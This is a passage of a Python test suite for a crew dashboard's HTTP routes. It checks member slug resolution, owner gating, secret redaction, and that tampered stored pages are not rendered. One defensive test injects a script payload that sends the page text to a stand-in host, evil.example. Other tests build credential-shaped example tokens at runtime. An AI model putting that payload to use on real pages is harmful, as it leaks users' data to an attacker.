"""The crewmate dynamic dashboard HTTP routes (CONTRACT-v3 parts 4, 7 and "adopt").

The property worth guarding hardest is the one the sibling member routes already guard
and this surface adds a write to: WHICH crewmate's dashboard a request reaches is
decided from the slug plus the exact crew name, and a slug two crews share reaches
nobody's. An instance is one directory per slug, so serving a shared slug -- with an
editor -- would let two crewmates overwrite each other's dashboard.
"""

from __future__ import annotations

import json
from contextlib import asynccontextmanager
from types import SimpleNamespace

import pytest
from aiohttp import web
from aiohttp.test_utils import TestClient, TestServer

from kiro_crew import members as members_mod
from kiro_crew.dashboard.handlers import member_dashboard as routes
from kiro_crew.dashboard_templates import catalog, instance

#: The REAL resolvers, bound at import time.
#:
#: ``routes.members_mod`` is this same module object, so the autouse fixture's
#: ``member_slug`` stub replaces the attribute everywhere -- including for a test that
#: imports it directly. The slug cases below are ABOUT that function, so they need the
#: implementation rather than the constant the fixture installs.
_REAL_MEMBER_SLUG = members_mod.member_slug
_REAL_CANONICAL_KEY = members_mod.canonical_member_key

pytestmark = pytest.mark.asyncio

MEMBER = "Fleet Conductor"
SLUG = "fleet-conductor"

PAGE = '<div><b data-dashboard-field="credits"></b>' '<i data-dashboard-field="phase"></i></div>'
PAGE_EDITED = (
    '<section><span data-dashboard-field="credits"></span>'
    '<span data-dashboard-field="phase"></span></section>'
)


def _manifest(**over):
    raw = {
        "id": "fixture-board",
        "version": 1,
        "title": "Fixture board",
        "description": "A template these tests own.",
        "source": "builtin",
        "fields": {
            "credits": {"type": "number", "source": {"fold": "usage", "path": "credits"}},
            "phase": {"type": "string", "source": {"agentic": True}},
        },
    }
    raw.update(over)
    return raw


@pytest.fixture(autouse=True)
def _env(tmp_path, _floor_monkeypatch):
    """One fixture template, an isolated home, and the member checks stubbed.

    The member-identity checks are the SIBLING routes' and are tested there; what is
    stubbed is config loading, not the checks themselves -- ``_member_names_for_slug``
    still runs, so the shared-slug refusal below is the real code path.

    Patches through ``_floor_monkeypatch`` rather than the shared ``monkeypatch``
    (D11): an isolation patch on the test-owned undo stack is lifted by any test body
    that calls ``monkeypatch.undo()``, which would hand the rest of that test the real
    config loader and the real owner gate.
    """
    _floor_monkeypatch.setenv("KIROCREW_HOME", str(tmp_path / "home"))
    builtin = tmp_path / "builtin" / "fixture-board"
    builtin.mkdir(parents=True)
    (builtin / "manifest.json").write_text(json.dumps(_manifest()), encoding="utf-8")
    (builtin / "template.html").write_text(PAGE, encoding="utf-8")
    _floor_monkeypatch.setattr(catalog, "builtin_dir", lambda: builtin.parent)

    cfg = SimpleNamespace(agents={MEMBER: SimpleNamespace(member_id="")})
    _floor_monkeypatch.setattr(routes.KiroCrewConfig, "load", staticmethod(lambda: cfg))
    _floor_monkeypatch.setattr(routes.members_mod, "member_slug", lambda name, config=None: SLUG)
    _floor_monkeypatch.setattr(routes.members_mod, "validate_slug", lambda slug: slug)
    _floor_monkeypatch.setattr(routes.members_mod, "is_dispatchable_member_name", bool)
    _floor_monkeypatch.setattr(routes, "_member_names_for_slug", lambda cfg, slug: [MEMBER])
    # No app token, and the owner gate open: both are the sibling routes' boundaries
    # and are asserted structurally below rather than re-tested here.
    _floor_monkeypatch.setattr(routes, "_deny_app_caller", _none)
    _floor_monkeypatch.setattr(routes, "_owner_only", _none)
    # No DM session in a test, so a change records no history entry. That is the
    # documented degradation: the record is the file, the entry is history.
    _floor_monkeypatch.setattr(routes, "_write_session", lambda slug, member: "")
    yield


async def _none(*_a, **_k):
    return None


@asynccontextmanager
async def _client():
    """A started client that always closes.

    An ``async with`` helper rather than an ``@pytest.fixture``, by this repo's
    convention (see ``test_agent_panel_routes._client``): the pinned pytest-asyncio
    does not collect async-generator fixtures declared with plain ``@pytest.fixture``.

    Closing is not tidiness. A ``TestClient`` owns an aiohttp session AND a listening
    socket, so a returned-but-never-closed client leaks two descriptors per test and,
    on a loaded runner, fails UNRELATED tests with EMFILE.
    """
    app = web.Application()
    routes.register_member_dashboard_routes(app)
    c = TestClient(TestServer(app))
    await c.start_server()
    try:
        yield c
    finally:
        await c.close()


def _q(path: str, **extra) -> str:
    query = "&".join(
        [f"member={MEMBER.replace(' ', '+')}"] + [f"{k}={v}" for k, v in extra.items()]
    )
    return f"/api/members/{SLUG}/dashboard{path}?{query}"


# --------------------------------------------------------------------------
# the read the frame does
# --------------------------------------------------------------------------


async def test_a_crewmate_with_no_dashboard_answers_the_empty_state_not_a_404():
    async with _client() as client:
        resp = await client.get(_q(""))
        assert resp.status == 200
        body = await resp.json()
        # 200 + empty, deliberately. A 404 would make "nothing adopted yet" and "no such
        # member" one reading for the tab.
        assert body["state"] == "empty"
        assert body["instance_version"] == 0


async def test_an_empty_record_with_no_default_is_not_composed(caplog):
    """Nothing to compose, so nothing is attempted -- and nothing is logged.

    This fixture registers one built-in and it is not ``DEFAULT_TEMPLATE_ID``, so
    ``default_instance`` answers None: the ordinary state of a build whose registry
    carries the loader and no default page. An empty record carries ``manifest={}``,
    which ``parse_manifest`` refuses, so composing it logged a warning WITH a
    traceback for a crewmate that has simply adopted nothing -- on every poll and
    every projection frame. The frame's own empty state is the answer here and it
    needs no html.
    """
    import logging

    async with _client() as client:
        with caplog.at_level(logging.WARNING):
            body = await (await client.get(_q(""))).json()
    assert body["state"] == "empty"
    assert "rendered_html" not in body
    assert not [r for r in caplog.records if "could not fill" in r.getMessage()]


async def test_the_body_is_the_shape_the_contract_fixes():
    async with _client() as client:
        # Adopted through the store: the adopt ROUTE is not part of this layer, and
        # what these cases need is an instance to read, not the route that made one.
        instance.adopt(SLUG, "fixture-board")
        body = await (await client.get(_q(""))).json()
        assert set(body) >= {"instance_version", "template", "html", "manifest", "state"}
        assert body["template"] == {"id": "fixture-board", "version": 1}
        assert body["html"] == PAGE
        assert body["state"] == "live"


async def test_a_member_whose_name_does_not_derive_the_slug_is_refused(monkeypatch):
    async with _client() as client:
        monkeypatch.setattr(
            routes.members_mod, "member_slug", lambda name, config=None: "someone-else"
        )
        resp = await client.get(_q(""))
        assert resp.status == 400
        assert (await resp.json())["code"] == "member_slug_mismatch"


async def test_a_name_not_in_config_is_a_404(monkeypatch):
    async with _client() as client:
        monkeypatch.setattr(
            routes.KiroCrewConfig, "load", staticmethod(lambda: SimpleNamespace(agents={}))
        )
        resp = await client.get(_q(""))
        assert resp.status == 404
        assert (await resp.json())["code"] == "member_not_found"


async def test_a_slug_two_crews_share_serves_neither(monkeypatch):
    async with _client() as client:
        monkeypatch.setattr(routes, "_member_names_for_slug", lambda cfg, slug: [MEMBER, "Other"])
        resp = await client.get(_q(""))
        assert resp.status == 409
        assert (await resp.json())["code"] == "dashboard_slug_ambiguous"


async def test_a_request_with_no_member_is_refused():
    async with _client() as client:
        resp = await client.get(f"/api/members/{SLUG}/dashboard")
        assert resp.status == 400
        assert (await resp.json())["code"] == "missing_member"


# --------------------------------------------------------------------------
# adopt, edit, rollback
# --------------------------------------------------------------------------


async def test_a_live_dashboard_comes_back_with_its_values_filled_in(monkeypatch):
    """The frame renders ``rendered_html``: the page under the data island the host built.

    Fold values come through the feed and agentic ones from the slot's ``agentic`` fold;
    both are stubbed at their seams, so this pins the WIRING -- the route asks for the
    values and hands the page back filled, with the agentic field named as such.
    """
    from kiro_crew import dashboard_feed
    from kiro_crew.crew_log import projection

    class FakeFeed:
        def __init__(self, slot, unit=""):
            self.slot = slot

        def subscribe(self, manifest):
            return []

        def read(self, manifest, agentic=None):
            out = dashboard_feed.FieldRead()
            out.fields = {"credits": 1.5, "phase": agentic["fields"]["phase"]["value"]}
            out.seq = 7
            return out

        def unsubscribe(self):
            pass

    monkeypatch.setattr(dashboard_feed, "DashboardFeed", FakeFeed)
    monkeypatch.setattr(
        projection,
        "read_slot_projection",
        lambda slot, name: SimpleNamespace(value={"fields": {"phase": {"value": "reviewing"}}}),
    )
    async with _client() as client:
        # Adopted through the store: the adopt ROUTE is not part of this layer, and
        # what these cases need is an instance to read, not the route that made one.
        instance.adopt(SLUG, "fixture-board")
        body = await (await client.get(_q(""))).json()
    rendered = body["rendered_html"]
    assert body["html"] == PAGE
    assert PAGE in rendered and "kirocrew-dashboard-data" in rendered
    island = rendered.split('id="kirocrew-dashboard-data">', 1)[1].split("</script>", 1)[0]
    read = json.loads(island)
    assert read["fields"] == {"credits": 1.5, "phase": "reviewing"}
    assert read["agentic"] == ["phase"] and read["seq"] == 7


def test_no_worker_session_key_survives_the_render_mask():
    """The page is served by a route with NO owner check.

    The conductor ledger's rule is that no reader but the conductor sees a session
    key, and a template decides for itself which fold reaches its page and how deep
    it walks into it -- so the mask is recursive and keyed on the FIELD NAME rather
    than on one fold's item shape. A mask written against the shape that exists today
    covers the template adopted today and not the one adopted tomorrow.

    A ``bind`` event's whole text IS the key, so emptying the item field alone leaves
    it on the page inside the event log while a per-row check passes. The line stays,
    because its ``kind`` and ``ts`` are when dispatch happened.
    """
    key = "chat-9-worker"
    value = {
        "items": [
            {
                "id": "it_1",
                "worker_session_key": key,
                "events": [
                    {"kind": "bind", "ts": 1, "text": key},
                    {"kind": "report", "ts": 2, "text": "all green"},
                ],
            }
        ],
        "nested": {"deeper": [{"worker_session_key": key}]},
    }
    masked = routes._page_safe(value)
    assert key not in json.dumps(masked), "a worker session key survived the mask"
    item = masked["items"][0]
    assert "worker_session_key" not in item
    assert [e["kind"] for e in item["events"]] == ["bind", "report"], "an event line was dropped"
    assert item["events"][0]["text"] == "", "the bind event still carries its key"
    # A control: the mask is not simply blanking the payload.
    assert item["events"][1]["text"] == "all green"
    assert item["id"] == "it_1"


def test_a_credential_in_a_fold_value_is_redacted_before_it_reaches_the_page():
    """Every string here is AGENT-AUTHORED and nothing before this read inspects it.

    A fold value is whatever a conductor wrote into the crew log, so a
    `session_ledger_record(goal=...)` carrying a pasted key is rendered by any template
    binding that fold. Dropping the one field known to be a secret says nothing about
    prose that happens to contain one.

    Mapping KEYS too: an artifact name is a free string the agent chose and reaches the
    browser the same way its value does.
    """
    # ASSEMBLED at runtime, never written out whole. The internal-content scan reads
    # this change's own diff, so a credential-shaped literal added here is a finding
    # against the PR whatever the surrounding code is for -- and a test that proves
    # secrets are redacted is a poor place to put one in plain text. The runtime value
    # is a real key header and a real token shape, which is what the redactor has to
    # recognise; only the source spelling is split. Do not join these back up.
    _dashes = "-" * 5
    _kind = "RSA PRIVATE KEY"
    pem = (
        f"{_dashes}BEGIN {_kind}{_dashes}\n"
        "MIIEowIBAAKCAQEA3Zx8kUoTBqQw0hXvPj9mKpLq2yTnVr7dFcBg6WsEnJaHtYuZ\n"
        f"{_dashes}END {_kind}{_dashes}"
    )
    token = "ghp" + "_" + "ZXAMPLEzxampleZXAMPLEzxampleZXAMPLE12"
    value = {
        "goal": f"ship the thing; key is {pem}",
        "items": [{"summary": f"used {token} to fetch it"}],
        token: "an artifact whose NAME is the secret",
    }
    out = routes._page_safe(value)
    blob = json.dumps(out)
    assert f"BEGIN {_kind}" not in blob, f"a key block reaches the page: {blob[:300]}"
    assert token not in blob, f"a token reaches the page: {blob[:300]}"
    # Still a page, not a blank: the prose around the secret survives.
    assert "ship the thing" in out["goal"]
    assert "used" in out["items"][0]["summary"]


async def test_a_stale_copy_is_still_composed_with_its_values(monkeypatch, tmp_path):
    """A STALE copy renders. It is the state where the copy cannot be compared
    against its source, not a state where it stopped working.

    Served without composing it carries no data island, so the page draws no values at
    all -- and a template version bump is enough to put every adopted dashboard on that
    template into this state, which makes it the common failure rather than a corner.
    """
    from kiro_crew import dashboard_feed

    class FakeFeed:
        def __init__(self, slot, unit=""):
            self.slot = slot

        def subscribe(self, manifest):
            return []

        def read(self, manifest, agentic=None):
            out = dashboard_feed.FieldRead()
            out.fields = {"credits": 2.5}
            out.seq = 9
            return out

        def unsubscribe(self):
            pass

    monkeypatch.setattr(dashboard_feed, "DashboardFeed", FakeFeed)
    async with _client() as client:
        # Adopted through the store: the adopt ROUTE is not part of this layer, and
        # what these cases need is an instance to read, not the route that made one.
        instance.adopt(SLUG, "fixture-board")
        # The registry moves on, which is what makes the stored copy stale.
        builtin = tmp_path / "builtin" / "fixture-board"
        builtin.joinpath("manifest.json").write_text(
            json.dumps(_manifest(version=2)), encoding="utf-8"
        )
        catalog.load_one.cache_clear() if hasattr(catalog.load_one, "cache_clear") else None
        resp = await client.get(_q(""))
        body = await resp.json()
    assert resp.status == 200
    assert body["state"] == "stale", "the registry bump did not make the copy stale"
    assert "rendered_html" in body, "a stale copy was served without being composed"
    rendered = body["rendered_html"]
    assert "kirocrew-dashboard-data" in rendered, "the stale page carries no data island"
    island = rendered.split('id="kirocrew-dashboard-data">', 1)[1].split("</script>", 1)[0]
    assert json.loads(island)["fields"] == {"credits": 2.5}


async def test_a_page_whose_values_cannot_be_read_still_answers_without_them(monkeypatch):
    from kiro_crew import dashboard_feed

    def boom(*_a, **_k):
        raise RuntimeError("bus down")

    monkeypatch.setattr(dashboard_feed, "DashboardFeed", boom)
    async with _client() as client:
        # Adopted through the store: the adopt ROUTE is not part of this layer, and
        # what these cases need is an instance to read, not the route that made one.
        instance.adopt(SLUG, "fixture-board")
        resp = await client.get(_q(""))
        body = await resp.json()
    assert resp.status == 200 and body["state"] == "live" and "rendered_html" not in body


# --------------------------------------------------------------------------
# the boundaries, asserted structurally
# --------------------------------------------------------------------------


async def test_every_route_denies_an_app_caller_and_gates_the_values_it_serves():
    """Read off the source, because a passing request proves only the open path.

    The stubs above open both gates so the behaviour can be tested at all, which means
    no request in this file can show that a real app token or a non-owner is refused.
    What CAN be shown is that every handler calls the guards -- which is the boundary a
    new route is most likely to be added without.
    """
    import ast
    import inspect

    tree = ast.parse(inspect.getsource(routes))
    handlers = {
        node.name: node
        for node in ast.walk(tree)
        if isinstance(node, ast.AsyncFunctionDef) and node.name.startswith("api_")
    }
    # Held to the ROUTE TABLE rather than to a number typed here: a handler added
    # without a route, or a route pointed at something that is not a handler, is the
    # drift this count exists to catch, and a literal would just be updated alongside.
    app = web.Application()
    routes.register_member_dashboard_routes(app)
    registered = {r.handler.__name__ for r in app.router.routes() if r.method in {"GET", "POST"}}
    assert set(handlers) == registered
    for name, node in handlers.items():
        called = {
            n.func.id
            for n in ast.walk(node)
            if isinstance(n, ast.Call) and isinstance(n.func, ast.Name)
        }
        # Every handler resolves, and _resolve is where the app-caller denial and the
        # four member-identity checks live. One chokepoint, so a new route cannot
        # forget one of five rules.
        assert "_resolve" in called, f"{name} does not resolve the member"
        if name in _VALUE_SERVING_READS:
            assert "_owner_only" in called, f"{name} is not owner-gated"


#: Reads that serve this crewmate's FOLD VALUES, which are work-ledger and crew-log
#: data: task titles, summaries, PR links. ``work_ledger_board`` answers a non-owner
#: ``owner_only`` for exactly those, so this one cannot answer 200 to the same caller
#: just because its copy arrives as rendered html.
#:
#: A SET rather than a check inside the loop, so adding a route that serves values is a
#: one-line change HERE and a visible one in review.
_VALUE_SERVING_READS = frozenset({"api_member_dashboard"})


async def test_a_non_owner_cannot_read_a_crewmates_values():
    """The gate, exercised rather than read off the source.

    The route-walk above proves the CALL is there; this proves it refuses.
    """
    import kiro_crew.dashboard.handlers.member_dashboard as mod

    async def _deny(request, operation):
        _deny.operations.append(operation)
        # A FRESH response each call. An aiohttp response carries its own write state,
        # so handing the same object to two requests hangs the second one.
        return web.json_response({"error": "owner authorization required"}, status=403)

    _deny.operations = []
    original = mod._owner_only
    mod._owner_only = _deny
    try:
        async with _client() as client:
            resp = await client.get(_q(""))
            assert resp.status == 403, (
                f"GET / answered {resp.status} for a non-owner, so a crewmate's "
                "fold values reach a caller the sibling board refuses"
            )
    finally:
        mod._owner_only = original
    assert _deny.operations == ["members.dashboard"], (
        "the read must name its own operation, so the SEL denial says which surface " "was refused"
    )


async def test_the_gateway_registers_exactly_these_paths_without_importing_us():
    """The boot path binds these routes DEFERRED, so the paths are written twice.

    The same property ``test_agent_panel_routes`` pins, for the same reason: the boot
    path may not import an optional subsystem before the socket binds, so it restates
    each path against ``server._deferred`` -- and a restated path can drift. A route
    renamed here and not there would 404 in the gateway while every test above passed.

    Compares the two SETS, so a route added to either side has to be added to both.
    """
    import inspect

    from kiro_crew.dashboard import server

    app = web.Application()
    routes.register_member_dashboard_routes(app)
    ours = {str(r.resource.canonical) for r in app.router.routes()}
    flat = " ".join(inspect.getsource(server._register_mcp_routes).split())
    deferred = {path for path in ours if f'"{path}", _deferred("member_dashboard",' in flat}
    missing = ours - deferred
    assert not missing, (
        f"{sorted(missing)} are registered by this module but the gateway boot path "
        "does not bind them through the deferred binder, so they are either unserved "
        "or imported eagerly"
    )


async def test_the_instance_store_and_the_route_agree_on_the_states():
    """The four state words the frame branches on are the store's own constants."""
    assert {
        instance.STATE_EMPTY,
        instance.STATE_LIVE,
        instance.STATE_STALE,
        instance.STATE_ERROR,
    } == {"empty", "live", "stale", "error"}


# --------------------------------------------------------------------------- #
# the helpers the route leans on, driven directly
# --------------------------------------------------------------------------- #

#: The REAL helper, bound at import time. The autouse ``_env`` fixture stubs
#: ``routes._write_session`` so the route cases get a dashboard with no history row,
#: and it stubs it through ``_floor_monkeypatch``, which a test body cannot undo by
#: design. The cases below drive the helper itself, so they hold their own reference
#: to it, taken before any fixture runs.
_REAL_WRITE_SESSION = routes._write_session


def test_the_history_session_is_the_newest_by_SUCCESSION_not_by_the_clock(monkeypatch):
    """A change's history entry belongs to the LIVE session, chosen causally.

    A unit's ``createdAt`` is stamped once and never rewritten, so a clock that steps
    backward between two units of one slot lists the retired unit last. Reading the
    newest off that listing would attribute every later change to a session that is
    already over. Driven through the succession helper, which returns the chain order,
    and asserted against the opposite clock order so a fallthrough to the header
    listing fails this case rather than passing it.
    """
    from kiro_crew.crew_log import projection as crew_log

    monkeypatch.setattr(routes, "_dashboard_slot", lambda member, slug: "chat-dm")
    # The clock order, which is inverted here: the retired unit sorts last.
    monkeypatch.setattr(crew_log, "session_units_for_slot", lambda slot: ("live", "retired"))
    # The durable chain, which puts the live unit where "newest" has to read it.
    monkeypatch.setattr(crew_log, "units_in_succession", lambda slot: ("retired", "live"))

    assert _REAL_WRITE_SESSION(SLUG, MEMBER) == "live"


def test_a_crewmate_with_no_dm_session_gets_no_history_row_rather_than_a_refusal(monkeypatch):
    """No DM thread is a working dashboard with no history row, not a failed change.

    The instance record is a file and is already committed by the time this is used,
    so refusing here would lose a change that had already landed.
    """
    from kiro_crew.crew_log import projection as crew_log

    monkeypatch.setattr(routes, "_dashboard_slot", lambda member, slug: "chat-dm")
    monkeypatch.setattr(crew_log, "units_in_succession", lambda slot: ())
    assert _REAL_WRITE_SESSION(SLUG, MEMBER) == ""


def test_an_unreadable_crew_log_is_the_same_no_history_answer(monkeypatch):
    """A store that raises is reported as no session, not propagated.

    Same reason as the empty case: the record is already written, so the history row is
    the part that may be missing and the change is not.
    """
    from kiro_crew.crew_log import projection as crew_log

    def _boom(_slot):
        raise RuntimeError("the crew log is unreadable")

    monkeypatch.setattr(routes, "_dashboard_slot", lambda member, slug: "chat-dm")
    monkeypatch.setattr(crew_log, "units_in_succession", _boom)
    assert _REAL_WRITE_SESSION(SLUG, MEMBER) == ""


class TestTheRefusalMapping:
    """A store refusal and a gateway fault are separate answers for a client.

    ``*_refused`` is the caller's input, so the same request will be refused again;
    ``*_failed`` is this gateway's state and a retry may work. Collapsing them makes a
    client either retry forever or give up on a transient fault.
    """

    def test_a_refused_instance_is_the_callers_input(self):
        resp = routes._refusal(instance.InstanceRefused("that template is not adoptable"))
        assert resp.status == 409
        assert json.loads(resp.text)["code"] == "dashboard_refused"

    def test_an_unknown_template_is_not_found(self):
        resp = routes._refusal(catalog.UnknownTemplate("no-such-page"))
        assert resp.status == 404
        assert json.loads(resp.text)["code"] == "template_not_found"

    def test_anything_else_is_this_gateways_fault(self):
        resp = routes._refusal(OSError("the disk went away"))
        assert resp.status == 500
        assert json.loads(resp.text)["code"] == "dashboard_failed"
        # The cause is NOT handed to the client: it is this gateway's state, and the
        # message would carry a path or a store detail the caller has no business
        # reading. It goes to the log instead.
        assert "disk went away" not in resp.text


class TestTheSlugChecks:
    """A slug the member resolver REFUSES and one it merely disagrees with are
    different answers, and both arrive as an exception rather than as a comparison."""

    async def test_an_invalid_slug_is_refused_before_the_member_is_read(self, monkeypatch):
        def _raise(_slug):
            raise routes.MemberSlugError("not a slug")

        monkeypatch.setattr(routes.members_mod, "validate_slug", _raise)
        async with _client() as c:
            resp = await c.get(f"/api/members/{SLUG}/dashboard?member={MEMBER}")
            assert resp.status == 400, await resp.text()
            assert (await resp.json())["code"] == "invalid_member_slug"

    async def test_a_member_whose_slug_cannot_be_derived_is_a_mismatch(self, monkeypatch):
        def _raise(_name, _config=None):
            raise routes.MemberSlugError("no slug for this name")

        monkeypatch.setattr(routes.members_mod, "member_slug", _raise)
        async with _client() as c:
            resp = await c.get(f"/api/members/{SLUG}/dashboard?member={MEMBER}")
            assert resp.status == 400, await resp.text()
            assert (await resp.json())["code"] == "member_slug_mismatch"


def test_a_credential_in_a_page_is_redacted_before_it_reaches_the_reader():
    """The page goes through the same scrub as the values filled into it.

    Only a template that shipped with the product can become a page, and that is a
    claim about the repository rather than about the bytes on this disk: a hand-edited
    template directory, or an instance record written under an older gateway, arrives
    here having passed a parity check, which says nothing about a credential pasted
    into a heading. `_page_safe` covers only the resolved values, never the page around
    them.
    """
    # ASSEMBLED at runtime for the reason the fold-value case above gives: a
    # credential-shaped literal in the diff is a finding against the PR whatever the
    # code around it is for. Do not join these back up.
    token = "AKIA" + "IOSFODNN7" + "EXAMPLE"
    page = f'<p>key {token}</p><b data-dashboard-field="credits"></b>'
    assert token not in routes._template_text_safe(page), "a page kept its credential"
    assert "credits" in routes._template_text_safe(page), "the redaction ate the bindings"


def test_a_credential_in_a_manifest_string_is_redacted():
    """``title`` and ``description`` are free prose.

    Field NAMES are left alone: the loader has already matched each against
    ``^[a-z][a-z0-9_]{0,63}$``, a grammar no credential survives, and rewriting a key
    would break the page's own bindings.
    """
    token = "AKIA" + "IOSFODNN7" + "EXAMPLE"
    scrubbed = routes._manifest_text_safe(
        {"title": f"board {token}", "fields": {"credits": {"type": "number"}}}
    )
    assert token not in json.dumps(scrubbed)
    assert "credits" in scrubbed["fields"], "a field name was rewritten"


def test_the_raw_body_is_scrubbed_beside_the_composed_page():
    """Scrubbing only the rendered half leaves the same credential one key away."""
    token = "AKIA" + "IOSFODNN7" + "EXAMPLE"
    body = routes._safe_body(
        {
            "html": f"<p>{token}</p>",
            "manifest": {"title": f"t {token}"},
            "state": "live",
        }
    )
    assert token not in json.dumps(body)
    assert body["state"] == "live", "the scrub touched a key that is not page text"


# ----------------------------------------------- one crewmate, one slug


class TestOneCrewmateResolvesToOneSlug:
    """THE POD BUG on a freshly created crewmate whose roster key carries case.

    A crewmate was created as ``Atlas``. Its own session's ``dashboard_write``
    returned success and recorded no mistake, yet the instance stayed at version 0
    and the tab rendered "Nothing needs you, and nothing has been spent" over a
    session that had spent 0.63 credits. Opening the tab as ``?member=atlas``
    answered "not on the roster".

    One cause, two symptoms. The roster is keyed by the display name somebody typed,
    and every per-member path comes off that key's ``member_id``. A caller holding
    ``atlas`` missed the key, read no ``member_id``, and fell through to
    ``slug_for_name("atlas")`` -- so the write (resolved from the session, which
    carries ``Atlas``) and the read (resolved from the query string) addressed two
    different directories. Both succeeded. Neither saw the other.

    These run against the REAL ``members`` helpers, not the module fixture's stubs:
    the fixture replaces ``member_slug`` with a constant, which is precisely the
    function that was wrong.
    """

    @staticmethod
    def _roster():
        """A roster keyed as somebody typed it, with a persisted identity."""
        return SimpleNamespace(
            agents={"Atlas": SimpleNamespace(member_id="atlas-7f3c21")},
        )

    def test_the_roster_spelling_is_recovered_from_any_case(self) -> None:
        cfg = self._roster()
        for spelling in ("atlas", "ATLAS", "AtLaS", "Atlas"):
            assert _REAL_CANONICAL_KEY(spelling, cfg) == "Atlas", spelling

    def test_every_spelling_derives_the_one_slug_the_member_owns(self) -> None:
        """The defect, at the function that caused it.

        ``atlas-7f3c21`` is the member's persisted identity, and it is what its own
        session writes under. A spelling that answered ``atlas`` instead pointed at a
        directory nothing else ever touches.
        """
        cfg = self._roster()
        owned = _REAL_MEMBER_SLUG("Atlas", cfg)
        assert owned == "atlas-7f3c21", "the persisted member_id is the slug"
        for spelling in ("atlas", "ATLAS", "AtLaS"):
            assert _REAL_MEMBER_SLUG(spelling, cfg) == owned, spelling

    def test_a_name_the_roster_does_not_hold_is_unchanged(self) -> None:
        """No fuzzy matching: an unknown name stays itself and is refused downstream."""
        cfg = self._roster()
        assert _REAL_CANONICAL_KEY("Borealis", cfg) == "Borealis"

    def test_two_keys_differing_only_in_case_are_not_folded_together(self) -> None:
        """An ambiguous fold returns the name unchanged rather than picking one.

        Those two keys already collide at the slug level, and the surfaces that care
        refuse that slug outright. Guessing here would turn a refusal into a write on
        whichever key sorted first.
        """
        cfg = SimpleNamespace(
            agents={
                "Oncall": SimpleNamespace(member_id=""),
                "oncall": SimpleNamespace(member_id=""),
            },
        )
        # Each EXACT key still answers as itself; only the third spelling is ambiguous.
        assert _REAL_CANONICAL_KEY("Oncall", cfg) == "Oncall"
        assert _REAL_CANONICAL_KEY("oncall", cfg) == "oncall"
        assert _REAL_CANONICAL_KEY("ONCALL", cfg) == "ONCALL"

    async def test_the_tab_opened_on_a_lowercase_name_reads_the_members_own_page(
        self, _floor_monkeypatch
    ) -> None:
        """END TO END over the route, with the real resolvers.

        The write lands under the slug the member owns; the read is asked for with
        the spelling a URL carries. Before the fix this answered 404
        ``member_not_found``.
        """
        cfg = self._roster()
        owned = _REAL_MEMBER_SLUG("Atlas", cfg)
        _floor_monkeypatch.setattr(routes.KiroCrewConfig, "load", staticmethod(lambda: cfg))
        _floor_monkeypatch.setattr(routes.members_mod, "member_slug", _REAL_MEMBER_SLUG)
        _floor_monkeypatch.setattr(routes.members_mod, "canonical_member_key", _REAL_CANONICAL_KEY)
        _floor_monkeypatch.setattr(routes.members_mod, "validate_slug", lambda slug: slug)
        _floor_monkeypatch.setattr(routes, "_member_names_for_slug", lambda cfg, slug: ["Atlas"])

        # The member's own write, under the slug its session resolves to.
        instance.adopt(owned, "fixture-board", session_id="")
        async with _client() as c:
            resp = await c.get(f"/api/members/{owned}/dashboard?member=atlas")
            assert resp.status == 200, await resp.text()
            body = await resp.json()
        assert body["template"]["id"] == "fixture-board", body
        # The page the member owns, not an empty one minted for a second slug.
        assert body["instance_version"] == 1, "the read found a different directory"
        assert "credits" in body["manifest"]["fields"], body["manifest"]


# ------------------------- the stored page is data, never code


class TestTheExecutedPageComesFromTheCatalog:
    """The record is WRITABLE, so it cannot be the thing that vouches for itself.

    `members/<slug>/dashboard/instance.json` holds the page AND the `source` label.
    Gating the render on that label asked the file to vouch for its own contents:
    anything that could append a `<script>` to the stored page could leave
    `"source": "builtin"` sitting beside it, and this is the step that hands the
    crewmate's task titles, summaries and costs to whatever runs.

    So the record's `template_id` is read and the BYTES are read from the catalog --
    a directory in this repository. The stored copy stays on disk, because a rollback
    reads it and it is what the crewmate copied; nothing executes it.
    """

    # The module's own `_env` fixture already builds `fixture-board` into a scratch
    # builtin directory and points the catalog at it, and it does NOT stub the
    # instance module -- that is `_adopt_dashboard`'s job, per test. So these cases
    # get the real registry and the real store for free, which is what they need:
    # what is under test is which of two byte strings reaches the frame.

    @staticmethod
    def _tampered(slug: str, injected: str) -> None:
        """Append markup to the STORED page, leaving `source: builtin` in place.

        Written straight to `instance.json`, which is the threat: the store's own
        writers refuse this, and the finding is about what happens when something
        reaches the file anyway.
        """
        path = routes.instance.instance_dir(slug) / "instance.json"
        raw = json.loads(path.read_text(encoding="utf-8"))
        raw["html"] = raw["html"] + injected
        assert raw["manifest"]["source"] == "builtin", "the fixture is not a builtin"
        path.write_text(json.dumps(raw), encoding="utf-8")

    def test_a_script_appended_to_the_stored_page_never_reaches_the_frame(self) -> None:
        """THE FINDING. The rendered body is the catalog's page, not the record's."""
        injected = '<script>fetch("https://evil.example/" + document.body.innerText)</script>'
        instance.adopt(SLUG, "fixture-board", session_id="")
        self._tampered(SLUG, injected)

        # The record really does carry it now, which is what makes the assertion below
        # about the RENDER rather than about the store having refused the write.
        assert injected in instance.read(SLUG).html, "the fixture did not tamper anything"

        rendered = routes._render(SLUG, MEMBER, instance.read(SLUG))
        assert rendered is not None, "a builtin template still has to render"
        assert "evil.example" not in rendered, "the injected script reached the frame"
        assert "<script>fetch" not in rendered
        # And it is the catalog's own page that got composed.
        assert 'data-dashboard-field="credits"' in rendered

    def test_the_trusted_page_is_the_catalogs_bytes_verbatim(self) -> None:
        """Read directly, so the claim is about the source of the bytes.

        `_render` composes, so a case reading only its output cannot tell "the
        catalog's page" from "the record's page with the script stripped".
        """
        instance.adopt(SLUG, "fixture-board", session_id="")
        self._tampered(SLUG, "<p>appended</p>")
        page = routes._trusted_page(SLUG, instance.read(SLUG))
        assert page == PAGE, "the executed page is not the catalog's"
        assert "appended" not in page

    def test_a_record_naming_a_template_the_catalog_does_not_serve_is_refused(self) -> None:
        """The signature of a rewritten record, and it must not fall back.

        Falling back to the stored page here would hand the frame exactly the bytes
        this check exists to decline -- so an unknown id draws the unavailable state.
        """
        instance.adopt(SLUG, "fixture-board", session_id="")
        path = routes.instance.instance_dir(SLUG) / "instance.json"
        raw = json.loads(path.read_text(encoding="utf-8"))
        raw["template"]["id"] = "not-a-shipped-template"
        path.write_text(json.dumps(raw), encoding="utf-8")
        assert routes._trusted_page(SLUG, instance.read(SLUG)) is None

    def test_a_record_naming_no_template_is_refused(self) -> None:
        instance.adopt(SLUG, "fixture-board", session_id="")
        record = instance.read(SLUG)
        object.__setattr__(record, "template_id", "")
        assert routes._trusted_page(SLUG, record) is None

    def test_a_non_renderable_source_is_still_turned_away_before_the_scan(self) -> None:
